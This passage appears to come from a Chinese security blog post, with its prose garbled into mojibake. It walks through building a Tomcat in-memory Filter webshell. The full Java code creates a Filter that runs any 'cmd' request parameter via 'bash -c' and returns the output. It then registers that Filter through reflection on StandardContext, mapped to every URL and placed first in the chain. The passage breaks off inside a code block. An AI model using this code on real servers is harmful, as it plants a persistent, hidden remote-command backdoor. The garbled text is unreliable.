<p>é€šè¿‡ä¸Šè¿°æµç¨‹å¯ä»¥çŸ¥é“ï¼Œæ¯æ¬¡è¯·æ±‚çš„ FilterChain æ˜¯åŠ¨æ€åŒ¹é…è·å–å’Œç”Ÿæˆçš„ï¼Œå¦‚æœæƒ³æ·»åŠ ä¸€ä¸ª Filter ï¼Œéœ€è¦åœ¨ StandardContext ä¸­ filterMaps ä¸­æ·»åŠ  FilterMapï¼Œåœ¨ filterConfigs ä¸­æ·»åŠ  FilterConfigã€‚è¿™æ ·ç¨‹åºåˆ›å»ºæ—¶å°±å¯ä»¥æ‰¾åˆ°æ·»åŠ çš„ Filter äº†ã€‚</p>
<h4 id="åˆ©ç”¨è¿‡ç¨‹">åˆ©ç”¨è¿‡ç¨‹<a hidden class="anchor" aria-hidden="true" href="#åˆ©ç”¨è¿‡ç¨‹">#</a></h4>
<p>çœ‹ä¸€ä¸‹<code>StandardContext</code>å­˜å‚¨çš„filterConfigã€filterMapsã€filterDefsã€‚</p>
<p><code>FilterMap</code>ä¸»è¦å­˜å‚¨<code>filterName</code> å’Œ <code>urlPattern</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415171352393.png" alt="image-20230415171352393"  />
</p>
<p><code>FilterConfig</code>ä¸»è¦å­˜å‚¨<code>FilterDef</code>å¯¹è±¡å’Œ<code>Filter</code>å¯¹è±¡ï¼ŒæŒ‡å®šå½“å‰çš„Contextä¸º<code>StandardContext</code>ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415171430760.png" alt="image-20230415171430760"  />
</p>
<p><code>FilterDef</code>ä¸»è¦å­˜å‚¨<code>filterName</code>å’Œ<code>FilterClass</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415171518374.png" alt="image-20230415171518374"  />
</p>
<p>å†…å­˜é©¬æ„é€ å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>åˆ›å»ºæ¶æ„ Filter</li>
<li>åˆ©ç”¨ FilterDef å¯¹ Filter è¿›è¡Œä¸€ä¸ªå°è£…</li>
<li>å°† FilterDef æ·»åŠ åˆ° FilterDefs å’Œ FilterConfig</li>
<li>åˆ›å»º FilterMap ï¼Œå°†æˆ‘ä»¬çš„ Filter å’Œ urlpattern ç›¸å¯¹åº”ï¼Œå­˜æ”¾åˆ° filterMapsä¸­ï¼ˆç”±äº Filter ç”Ÿæ•ˆä¼šæœ‰ä¸€ä¸ªå…ˆåé¡ºåºï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯æ”¾åœ¨æœ€å‰é¢ï¼Œè®©æˆ‘ä»¬çš„ Filter æœ€å…ˆè§¦å‘ï¼‰</li>
</ol>
<p>å› ä¸ºæ¯æ¬¡è¯·æ±‚<code>createFilterChain</code>éƒ½ä¼šä¾æ®æ­¤åŠ¨æ€ç”Ÿæˆä¸€ä¸ªè¿‡æ»¤é“¾.</p>
<p>è€Œ<code>StandardContext</code>åˆä¼šä¸€ç›´ä¿ç•™åˆ°Tomcatç”Ÿå‘½å‘¨æœŸç»“æŸï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å†…å­˜é©¬å°±å¯ä»¥ä¸€ç›´é©»ç•™ä¸‹å»ï¼Œç›´åˆ°Tomcaté‡å¯ã€‚</p>
<h5 id="åˆ›å»ºæ¶æ„filter">åˆ›å»ºæ¶æ„Filter<a hidden class="anchor" aria-hidden="true" href="#åˆ›å»ºæ¶æ„filter">#</a></h5>
<p>æ¶æ„çš„Filterï¼Œæ¥å—cmdä¸ºå‚æ•°ï¼Œè°ƒç”¨<code>new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</code>å®ç°å‘½ä»¤æ‰§è¡Œã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String filtername = <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Filter filter = <span style="color:#fff;font-weight:bold">new</span> Filter() {
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> init(FilterConfig filterConfig) <span style="color:#fff;font-weight:bold">throws</span> ServletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) <span style="color:#fff;font-weight:bold">throws</span> IOException, ServletException {
</span></span><span style="display:flex;"><span>                HttpServletRequest req = (HttpServletRequest) servletRequest;
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (req.<span style="color:#007f7f">getParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>) != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">byte</span>[] bytes = <span style="color:#fff;font-weight:bold">new</span> <span style="color:#fff;font-weight:bold">byte</span>[<span style="color:#ff0;font-weight:bold">1024</span>];
</span></span><span style="display:flex;"><span>                    Process process = <span style="color:#fff;font-weight:bold">new</span> ProcessBuilder(<span style="color:#0ff;font-weight:bold">&#34;bash&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;-c&#34;</span>,req.<span style="color:#007f7f">getParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>)).<span style="color:#007f7f">start</span>();
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">int</span> len = process.<span style="color:#007f7f">getInputStream</span>().<span style="color:#007f7f">read</span>(bytes);
</span></span><span style="display:flex;"><span>                    servletResponse.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">write</span>(<span style="color:#fff;font-weight:bold">new</span> String(bytes,<span style="color:#ff0;font-weight:bold">0</span>,len));
</span></span><span style="display:flex;"><span>                    process.<span style="color:#007f7f">destroy</span>();
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                filterChain.<span style="color:#007f7f">doFilter</span>(servletRequest,servletResponse);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> destroy() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        };
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="å°è£…filterdef">å°è£…FilterDef<a hidden class="anchor" aria-hidden="true" href="#å°è£…filterdef">#</a></h5>
<p>æ„é€ ä¸€ä¸ª<code>FilterDef</code>,è®¾ç½®å®ƒçš„FilterName,FilterClass,Filterå¯¹è±¡ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>FilterDef filterDef = <span style="color:#fff;font-weight:bold">new</span> FilterDef();
</span></span><span style="display:flex;"><span>filterDef.<span style="color:#007f7f">setFilter</span>(filter);
</span></span><span style="display:flex;"><span>filterDef.<span style="color:#007f7f">setFilterName</span>(filtername);
</span></span><span style="display:flex;"><span>filterDef.<span style="color:#007f7f">setFilterClass</span>(filter.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getName</span>());
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ·»åŠ åˆ°-filterdefs-å’Œ-filterconfig">æ·»åŠ åˆ° FilterDefs å’Œ FilterConfig<a hidden class="anchor" aria-hidden="true" href="#æ·»åŠ åˆ°-filterdefs-å’Œ-filterconfig">#</a></h5>
<p><code>StandardContext</code>æä¾›äº†<code>addFilterDef</code>æ–¹æ³•æ¥æ·»åŠ <code>FilterDefs</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415173004051.png" alt="image-20230415173004051"  />
</p>
<p><code>StandardContext</code>ä¸­filterConfigså‚æ•°å®é™…ä¸Šæ˜¯ä¸ªhashmapï¼Œé€šè¿‡åå°„è·å–filterConfigsï¼Œç„¶åputå³å¯ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415173354945.png" alt="image-20230415173354945"  />
</p>
<p>æ¥ä¸‹æ¥æ˜¯éœ€è¦æ„é€ <code>ApplicationFilterConfig</code>ç±»çš„å¯¹è±¡å³å¯ï¼Œ<code>ApplicationFilterConfig</code>å®é™…ä¸Šå°±æ˜¯<code>FilterConfig</code>çš„å®ç°ç±»ï¼ŒæŸ¥çœ‹ApplicationFilterConfigçš„æ„é€ ç±»ï¼Œéœ€è¦ä¼ å…¥<code>Context</code>å’Œ<code>FilterDef</code>ã€‚é€šè¿‡åå°„å®ç°æ„é€ å‡½æ•°å®ä¾‹åŒ–å³å¯ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415173802732.png" alt="image-20230415173802732"  />
</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * å°†filterDefæ·»åŠ åˆ°filterDefsä¸­
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> */</span>
</span></span><span style="display:flex;"><span>standardContext.<span style="color:#007f7f">addFilterDef</span>(filterDef);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// åå°„è·å¾—ApplicationFilterConfigçš„æ„é€ æ–¹æ³•
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>Constructor constructor = ApplicationFilterConfig.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredConstructor</span>(Context.<span style="color:#007f7f">class</span>,FilterDef.<span style="color:#007f7f">class</span>);
</span></span><span style="display:flex;"><span>constructor.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// å®ä¾‹åŒ–
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.<span style="color:#007f7f">newInstance</span>(standardContext,filterDef);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// å‹å…¥filterConfigs
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>filterConfigs.<span style="color:#007f7f">put</span>(filtername,filterConfig);
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="filtermaps">FilterMaps<a hidden class="anchor" aria-hidden="true" href="#filtermaps">#</a></h5>
<p>filterMapséœ€è¦è®¾ç½®åç§°ï¼Œpatternï¼Œdispatcher</p>
<p>è¿™é‡Œçš„dispatcheréœ€è¦è®¾ç½®ä¸ºDispatcherType.REQUESTï¼Œè¯¥é€‰é¡¹æŒ‡å®šäº†filterè¿‡æ»¤å™¨æ ¹æ®DispatcherTypeçš„ç±»å‹æ˜¯å¦æ‰§è¡Œã€‚è¿™</p>
<p>FilterMapså¯ä»¥ç”¨ä¸¤ç§æ–¹å¼æ·»åŠ mapï¼šaddFilterMap æˆ–è€…addFilterMapBefore()ï¼Œåè€…å¯ä»¥å°†filteræ·»åŠ è‡³æœ€å‰é¢,è¿™å°±è§£å†³äº†Filteræ‰§è¡Œé¡ºåºçš„é—®é¢˜ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415174308282.png" alt="image-20230415174308282"  />
</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>FilterMap filterMap = <span style="color:#fff;font-weight:bold">new</span> FilterMap();
</span></span><span style="display:flex;"><span>filterMap.<span style="color:#007f7f">addURLPattern</span>(<span style="color:#0ff;font-weight:bold">&#34;/*&#34;</span>);
</span></span><span style="display:flex;"><span>filterMap.<span style="color:#007f7f">setFilterName</span>(filtername);
</span></span><span style="display:flex;"><span>filterMap.<span style="color:#007f7f">setDispatcher</span>(DispatcherType.<span style="color:#007f7f">REQUEST</span>.<span style="color:#007f7f">name</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>standardContext.<span style="color:#007f7f">addFilterMapBefore</span>(filterMap);
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ•ˆæœ">æ•ˆæœ<a hidden class="anchor" aria-hidden="true" href="#æ•ˆæœ">#</a></h5>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
